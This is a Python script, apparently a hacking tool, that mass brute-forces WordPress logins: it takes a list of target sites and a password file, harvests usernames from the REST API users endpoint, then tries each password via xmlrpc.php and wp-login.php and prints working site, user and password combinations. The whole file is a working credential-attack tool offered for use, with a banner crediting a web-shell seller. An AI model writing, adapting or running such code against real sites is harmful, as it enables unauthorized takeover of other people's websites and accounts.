import os
import re
import requests
from colorama import Fore, init
init(autoreset=True)

green = Fore.LIGHTGREEN_EX
red = Fore.LIGHTRED_EX
white = Fore.LIGHTWHITE_EX
yellow = Fore.LIGHTYELLOW_EX
#SharkRangeIP
xx = """{}
       _________         .    .
      (..       \_    ,  |\  /|
       \       O  \  /|  \ \/ /
        \______    \/ |   \  / 
           vvvv\    \ |   /  |
           \^^^^  ==   \_/   |
            `\_   ===    \.  |
            / /\_   \ /      |
            |/   \_  \|      /
                   \________/{}
\t[+] Xmlrpc and Wp-login Wordpress BF [+]
\t[+] Thanks To {}@sellwebshells {}and {}@zal_gans [+]{}""".format(green,white,red,white,red,white)

No = 1
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"}
def XmlRpc(url, Password, User):
  global No
  global headers
  print("==== {} ====").format(str(No))
  No += 1
  url = url.replace("\n","").replace("\r","")
  if url.endswith("/"):
    url = url[:-1]
  CheckXml = "{}/xmlrpc.php?rsd".format(url)
  Xml = "{}/xmlrpc.php".format(url)
  try:
    for Pass in open(Password,"r").readlines():
      Pass = Pass.replace("\n","").replace("\r","")
      XmlPost = """<methodCall> <methodName>wp.getUsersBlogs</methodName> <params> <param><value><string>{}</string></value></param> <param><value><string>{}</string></value></param> </params></methodCall>""".format(User,Pass)
      ReqCheckXml = requests.get(CheckXml, headers=headers, timeout=20)
      if "WordPress" in ReqCheckXml.text or ReqCheckXml.status_code == 200:
        ReqXmlPost = requests.post(Xml, data=XmlPost, headers=headers, timeout=20).text
        if "<name>isAdmin</name>" in ReqXmlPost:
          ReqWPLogin = requests.get(url+"/wp-login.php", headers=headers, timeout=20).text
          if "log" in ReqWPLogin:
            print(green+">> Done "+white+url+"/wp-login.php|"+User+"|"+Pass)
            break
          else:
            print(yellow+">> Done "+white+url+"/xmlrpc.php|"+User+"|"+Pass)
        else:
          print(red+"<< Failed "+white+url+"/xmlrpc.php|"+User+"|"+Pass)
      else:
        try:
          ReqWPLogin = requests.get(url+"/wp-login.php", headers=headers, timeout=20).text
          if "log" in ReqWPLogin:
            datalog = {
              'log': User,
              'pwd': Pass,
              'wp-submit': 'Log+In',
              'redirect_to': url+'/wp-admin/',
              'testcookie': 1
            }
            ReqLogin = requests.post(url+"/wp-login.php", data=datalog, allow_redirects=False, headers=headers, timeout=25)
            ReqDash = requests.get(url+'/wp-admin/', headers=headers, cookies=ReqLogin.cookies.get_dict(), timeout=50).text
            if "?action=logout" in ReqDash:
              print(green+">> Done "+white+url+"/wp-login.php|"+User+"|"+Pass)
              break
          else:
            print(red+"<< Failed BF wp-login "+white+url)
            break
        except:
          print(red+"<< Unknown Death "+white+url)
          break
  except:
    print(red+"<< Unknown Death "+white+url)

if __name__ == "__main__":
  if os.name == "nt":
    os.system("cls")
  else:
    os.system("clear")
  print(xx)
  Target = raw_input(green+"List >> "+white)
  Password = raw_input(green+"Passwors >> "+white)
  try:
    for url in open(Target,"r").readlines():
      url = url.replace("\n","").replace("\r","")
      CheckUser = requests.get(url+"/wp-json/wp/v2/users", headers=headers, timeout=20).text
      if "slug" in CheckUser:
        Users = re.findall('"slug":"(.*?)"', CheckUser)
        for User in Users:
          XmlRpc(url, Password, User)
      else:
        print(red+"<< Unknown User += admin "+white+url)
        XmlRpc(url, Password, "admin")
  except:
    print(green+"Check your connection!"+white)
